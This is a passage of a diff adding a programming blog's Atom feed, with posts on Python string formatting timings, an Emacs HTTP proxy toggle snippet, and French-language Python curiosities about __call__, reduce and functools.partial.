+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;code_obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;exec&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;disassemble&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;code_obj&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;1&lt;/span&gt;           &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;LOAD_CONST&lt;/span&gt;               &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello {}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+              &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="n"&gt;LOAD_ATTR&lt;/span&gt;                &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+              &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="n"&gt;LOAD_NAME&lt;/span&gt;                &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+              &lt;span class="mi"&gt;9&lt;/span&gt; &lt;span class="n"&gt;CALL_FUNCTION&lt;/span&gt;            &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;positional&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;keyword&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;12&lt;/span&gt; &lt;span class="n"&gt;STORE_NAME&lt;/span&gt;               &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;15&lt;/span&gt; &lt;span class="n"&gt;LOAD_CONST&lt;/span&gt;               &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+             &lt;span class="mi"&gt;18&lt;/span&gt; &lt;span class="n"&gt;RETURN_VALUE&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We see a &lt;code&gt;LOAD_ATTR&lt;/code&gt; then &lt;code&gt;CALL_FUNCTION&lt;/code&gt; when &lt;code&gt;.format()&lt;/code&gt; is called. On the other side,
+&lt;code&gt;BINARY_MODULO&lt;/code&gt; does most of the job.&lt;/p&gt;
+&lt;p&gt;about timing:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;timeit&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stmt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a = &amp;quot;test&amp;quot;; s = &amp;quot;hello &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;quot; %a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%.2f&lt;/span&gt;&lt;span class="s2"&gt; usec/pass&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000000&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;100000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="mf"&gt;0.17&lt;/span&gt; &lt;span class="n"&gt;usec&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;pass&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stmt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a = &amp;quot;test&amp;quot;; s = &amp;quot;hello {}&amp;quot;.format(a)&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%.2f&lt;/span&gt;&lt;span class="s2"&gt; usec/pass&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000000&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;100000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="mf"&gt;0.33&lt;/span&gt; &lt;span class="n"&gt;usec&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;pass&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;%&lt;/code&gt; wins. Please not that it was just a simple sample, without complexity.&lt;/p&gt;
+&lt;p&gt;As &lt;code&gt;.format(*args, **kwargs)&lt;/code&gt; is way more sophisticated than &lt;code&gt;%&lt;/code&gt; for string interpolation,
+theses results are is not surprising in any way. They were just good candidates to illustrate
+&lt;code&gt;dis&lt;/code&gt; and &lt;code&gt;timeit&lt;/code&gt; python's modules.&lt;/p&gt;</content><category term="python"></category></entry><entry><title>Emacs and HTTP(s) proxies</title><link href="http://blog.devsda.fr/emacs-proxy.html" rel="alternate"></link><published>2016-10-26T10:20:00+02:00</published><updated>2016-10-26T10:20:00+02:00</updated><author><name>Thomas</name></author><id>tag:blog.devsda.fr,2016-10-26:/emacs-proxy.html</id><summary type="html">&lt;p&gt;use HTTP(s) through proxy through emacs&lt;/p&gt;</summary><content type="html">&lt;p&gt;If you are using emacs and HTTP related functionalities, you
+could use the following snippet to reach a domain through an HTTP proxy.
+It works for most of the stuff I've tested so far, including
+the handy &lt;a href="https://github.com/pashky/restclient.el"&gt;rest-client&lt;/a&gt; and &lt;code&gt;package-*&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;defun&lt;/span&gt; &lt;span class="nv"&gt;unset-proxy&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;&amp;amp;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;interactive&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;setenv&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http_proxy&amp;quot;&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;setenv&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;https_proxy&amp;quot;&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;setq&lt;/span&gt; &lt;span class="nv"&gt;url-proxy-services&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;defun&lt;/span&gt; &lt;span class="nv"&gt;set-proxy&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;&amp;amp;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;interactive&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;setq&lt;/span&gt; &lt;span class="nv"&gt;url-proxy-services&lt;/span&gt;
+    &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;no_proxy&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;^\\(localhost\\|127.*\\)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+      &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;proxy.yourdomain.com:8080&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+      &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;proxy.yourdomain.com:8080&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Just after evaluation, you can use &lt;code&gt;M-x set-proxy&lt;/code&gt; and &lt;code&gt;M-x unset-proxy&lt;/code&gt;.&lt;/p&gt;</content><category term="emacs"></category></entry><entry><title>WTF Python</title><link href="http://blog.devsda.fr/WTFPython.html" rel="alternate"></link><published>2016-09-03T22:20:00+02:00</published><updated>2016-09-03T22:20:00+02:00</updated><author><name>devsda</name></author><id>tag:blog.devsda.fr,2016-09-03:/WTFPython.html</id><summary type="html">&lt;p&gt;Des snippets intrigants&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Le paradoxe objet&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;real&lt;/span&gt;    &lt;span class="c1"&gt;# même un simple `integer` est un objet. Des parenthèses sont nécessaires pour&lt;/span&gt;
+            &lt;span class="c1"&gt;# accéder aux attributs.&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;En python, tout est objet... donc une banale fonction est un objet,
+comportant une methode &lt;code&gt;__call__&lt;/code&gt; qui permet l'appel via la syntaxe &lt;code&gt;function( * arguments )&lt;/code&gt;.
+Donc, une methode &lt;code&gt;__call__&lt;/code&gt; est un object  callable  qui ... possède une méthode &lt;code&gt;__call__&lt;/code&gt;...&lt;/p&gt;
+&lt;p&gt;L'extrait suivant est valide:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__call__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="bp"&gt;True&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;idem :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__call__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__call__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__call__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__call__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__call__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="bp"&gt;True&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;On peut aller loin :)
+À l'heure actuelle, je n'ai pas une idée précise de ce qu'il se passe dans
+les &lt;em&gt;internals&lt;/em&gt; de cpython.
+Parce que:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;a&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;yop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_call_&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;wrapper&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;_call_&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="nb"&gt;object&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x7f3e3db589d8&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_call_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_call_&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_call_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;wrapper&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;_call_&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="nb"&gt;object&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x7f3e3db589d8&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;wrapper&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;_call_&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;method&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;wrapper&lt;/span&gt; &lt;span class="nb"&gt;object&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mh"&gt;0x7f3e3db6d320&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Si c'était un objet avec une référence &lt;code&gt;__call__&lt;/code&gt; sur lui même, ok, mais
+&lt;code&gt;0x7f3e3db6d320&lt;/code&gt; et &lt;code&gt;0x7f3e3db589d8&lt;/code&gt; ne réfèrent pas aux mêmes objets.&lt;/p&gt;
+&lt;h2&gt;Multiples clefs&lt;/h2&gt;
+&lt;p&gt;&lt;img alt="python-mul" src="http://blog.devsda.fr/images/snake-anat.png"&gt;&lt;/p&gt;
+&lt;p&gt;Pour chopper des valeures profondément enfouies
+dans des dictionnaires imbriqués avec &lt;a href="https://docs.python.org/3/library/functools.html#functools.reduce"&gt;reduce&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;functools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nb"&gt;reduce&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="o"&gt;...&lt;/span&gt;   &lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="o"&gt;...&lt;/span&gt;   &lt;span class="s1"&gt;&amp;#39;sub&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="o"&gt;...&lt;/span&gt;     &lt;span class="s1"&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;
+&lt;span class="o"&gt;...&lt;/span&gt;   &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="o"&gt;...&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sub&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="mi"&gt;5&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Un usage pas forcément super intuitif de la fonction &lt;code&gt;reduce&lt;/code&gt;.
+On peut même la tweaker en lui filant
+&lt;code&gt;lambda x, k: x.__getitem__(k)&lt;/code&gt;, ce qui permet d'y imbriquer des listes en plus, et
+de spécifier leur index dans le  tuple  en second argument de  reduce .
+Du genre:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__getitem__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;un&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;truc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bien&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;enfoui&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;la_valeur&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# équivalent à&lt;/span&gt;
+&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;un&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;truc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bien&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;enfoui&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;la_valeur&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Fonctions spécialisées avec &lt;em&gt;functools.partial&lt;/em&gt;&lt;/h2&gt;
+&lt;p&gt;c4399ffdae1070fcd476157f4ab4109448d15b77&lt;/p&gt;
+&lt;p&gt;&lt;img alt="safe" src="http://blog.devsda.fr/images/safe.gif"&gt;&lt;/p&gt;
+&lt;p&gt;Rien de très inédit ici.
+Les &lt;a href="https://en.wikipedia.org/wiki/Partial application"&gt;application partielles&lt;/a&gt; des fonctions (&lt;em&gt;partial application&lt;/em&gt;) sont
+un moyen élégant de spécialiser des fonctions. La spécialisation permet alors un niveau d'abstraction
+via la rétention des paramètres initiaux, qui sont alors "masqués" lors de l'usage final de la fonction
+spécialisée.&lt;/p&gt;
+&lt;p&gt;Voir aussi : &lt;a href="https://en.wikipedia.org/wiki/Closure_(computer_programming)"&gt;closures&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;functools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;partial&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;acc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;partial&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;list()&lt;/code&gt; permet ici d'itérer au fil du générateur, et ainsi d'obtenir une liste des résultats.
+Le comportement des générateurs ainsi des fonctions "plus classiques" est évidemment conservé.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;ps: Il me semble qu'un mec m'a montré une fois comment assigner une autre valeur à la valeur
+d'un entier littéral (du genre, vraiment '2 == 3' qui renvoit 'True').&lt;/em&gt;
+&lt;em&gt;Je suis quasi-sûr que c'était avec Python, mais aucune idée de la version.
+N'hésitez pas à vous manifester si cela vous
+dit quelque chose :)&lt;/em&gt;&lt;/p&gt;
